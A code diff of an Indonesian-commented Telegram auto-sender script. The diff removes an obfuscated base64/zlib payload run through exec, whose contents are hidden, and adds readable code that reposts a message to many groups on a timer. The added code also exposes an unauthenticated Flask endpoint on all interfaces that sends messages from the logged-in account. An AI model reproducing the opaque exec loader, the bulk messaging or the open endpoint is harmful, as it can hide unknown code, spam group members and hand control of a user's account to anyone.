@@ -1,3 +1,185 @@
-# Coded by @forumkt
-# -------------------------------
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+from flask import Flask, jsonify, request
+from telethon import TelegramClient
+import asyncio
+from colorama import Fore, Style, init
+import os
+from dotenv import load_dotenv
+from threading import Thread
+
+# Inisialisasi Flask
+app = Flask('')
+
+@app.route('/')
+def home():
+    """Endpoint default untuk memeriksa status bot."""
+    return "Telegram Bot is running!"
+
+@app.route('/send_message', methods=['POST'])
+def send_message_api():
+    """Endpoint untuk mengirim pesan ke grup tertentu melalui API."""
+    data = request.json
+    group_name = data.get('group_name')
+    message = data.get('message')
+
+    if not group_name or not message:
+        return jsonify({"error": "Nama grup dan pesan wajib diisi."}), 400
+
+    async def send_to_group():
+        try:
+            group = await client.get_entity(group_name)
+            await client.send_message(group, message)
+            return jsonify({"success": f"Pesan terkirim ke grup {group_name}."})
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+
+    asyncio.run(send_to_group())
+    return jsonify({"message": "Pesan sedang diproses."})
+
+def run_flask():
+    """Jalankan server Flask di thread terpisah."""
+    app.run(host='0.0.0.0', port=8080)
+
+def keep_alive():
+    """Jaga Flask tetap aktif."""
+    t = Thread(target=run_flask, daemon=True)
+    t.start()
+
+# Inisialisasi Colorama untuk warna terminal
+init(autoreset=True)
+
+# Muat variabel lingkungan dari file .env
+load_dotenv()
+
+# Fungsi utilitas
+def clear():
+    """Hapus layar terminal."""
+    if os.name == 'nt':
+        os.system('cls')  # Windows
+    else:
+        os.system('clear')  # Unix/Linux/macOS
+
+def print_logo():
+    """Cetak logo aplikasi."""
+    print(Fore.YELLOW + Style.BRIGHT + r"""
+▄▀█ █░█ ▀█▀ █▀█   █▀ █▀▀ █▄░█ █▀▄ █▀▀ █▀█
+█▀█ █▄█ ░█░ █▄█   ▄█ ██▄ █░▀█ █▄▀ ██▄ █▀▄
+""" + Fore.CYAN + Style.BRIGHT + r"""
+       Coded by @forumkt
+""")
+
+def get_env_variable(var_name, prompt, is_numeric=False):
+    """
+    Ambil variabel dari .env, atau minta input pengguna jika tidak ditemukan.
+    """
+    value = os.getenv(var_name)
+    if value is None or value.strip() == "":
+        clear()  # Bersihkan layar sebelum input
+        while True:
+            value = input(f"{prompt}: ").strip()
+            if not value:
+                print(Fore.RED + Style.BRIGHT + "Input tidak boleh kosong. Silakan coba lagi.")
+                continue
+            if is_numeric and not value.isdigit():
+                print(Fore.RED + Style.BRIGHT + "Input harus berupa angka. Silakan coba lagi.")
+                continue
+            # Simpan ke .env
+            with open('.env', 'a') as env_file:
+                env_file.write(f"{var_name}={value}\n")
+            break
+    return int(value) if is_numeric else value
+
+# Konfigurasi utama dari .env
+api_id = get_env_variable('API_ID', 'Masukkan API ID', is_numeric=True)
+api_hash = get_env_variable('API_HASH', 'Masukkan API Hash')
+phone_number = get_env_variable('PHONE_NUMBER', 'Masukkan Nomor Telepon')
+sender_username = get_env_variable('SENDER_USERNAME', 'Masukkan Username Pengirim')
+group_count = get_env_variable('GROUP_COUNT', 'Masukkan Jumlah Grup untuk Mengirim Pesan', is_numeric=True)
+interval_minutes = get_env_variable('INTERVAL_MINUTES', 'Masukkan Interval Waktu Pengiriman Pesan (menit)', is_numeric=True)
+
+# Inisialisasi Telegram Client
+client = TelegramClient('session_name', api_id, api_hash)
+
+# Fungsi Telegram
+async def get_last_message(client, username):
+    """Ambil pesan terakhir dari pengguna tertentu."""
+    try:
+        user = await client.get_entity(username)
+        messages = await client.get_messages(user, limit=1)
+        return messages[0].text if messages else None
+    except Exception as e:
+        print(Fore.RED + f"Gagal mendapatkan pesan dari {username}: {e}")
+        return None
+
+async def get_groups(client):
+    """Dapatkan daftar grup dari akun."""
+    try:
+        dialogs = await client.get_dialogs()
+        return [dialog.entity for dialog in dialogs if dialog.is_group]
+    except Exception as e:
+        print(Fore.RED + f"Gagal mendapatkan grup: {e}")
+        return []
+
+async def send_message(client, group, message):
+    """Kirim pesan ke grup."""
+    try:
+        await client.send_message(group, message)
+        print(Fore.GREEN + f"Pesan terkirim ke grup {group.title}")
+    except Exception as e:
+        print(Fore.RED + f"Gagal mengirim pesan ke grup {group.title}: {e}")
+
+# Alur utama pengiriman pesan
+async def send_messages_periodically(client):
+    """Kirim pesan ke grup dalam interval tertentu."""
+    interval_seconds = interval_minutes * 60
+    while True:
+        clear()
+        await print_logo_and_account_info(client)
+
+        # Ambil pesan terbaru
+        message = await get_last_message(client, sender_username)
+        if not message:
+            print(Fore.YELLOW + f"Tidak ada pesan terbaru dari {sender_username}.")
+            await asyncio.sleep(10)
+            continue
+
+        # Ambil grup
+        groups = await get_groups(client)
+        if not groups:
+            print(Fore.RED + "Tidak ada grup yang ditemukan.")
+            break
+
+        # Batasi jumlah grup
+        selected_groups = groups[:min(group_count, len(groups))]
+
+        for group in selected_groups:
+            await send_message(client, group, message)
+            await asyncio.sleep(6)  # Jeda antar pesan
+
+        print(Fore.CYAN + f"Menunggu {interval_minutes} menit sebelum pengiriman berikutnya...")
+        await asyncio.sleep(interval_seconds)
+
+async def print_logo_and_account_info(client):
+    """Cetak logo dan informasi akun."""
+    print_logo()
+    try:
+        me = await client.get_me()
+        print(Fore.YELLOW + f"Username: {me.username or 'Tidak ada username'}")
+        print(Fore.YELLOW + f"Nomor Telepon: {me.phone or 'Tidak ada nomor telepon'}")
+    except Exception as e:
+        print(Fore.RED + f"Gagal mendapatkan informasi akun: {e}")
+
+async def main():
+    """Jalankan bot Telegram."""
+    await client.start(phone_number)
+    print(Fore.WHITE + "Bot aktif, siap mengirim pesan...")
+    await asyncio.gather(
+        send_messages_periodically(client)
+    )
+
+# Jalankan aplikasi
+if __name__ == '__main__':
+    # Jaga Flask tetap aktif
+    keep_alive()
+
+    # Jalankan Telegram bot
+    asyncio.run(main())
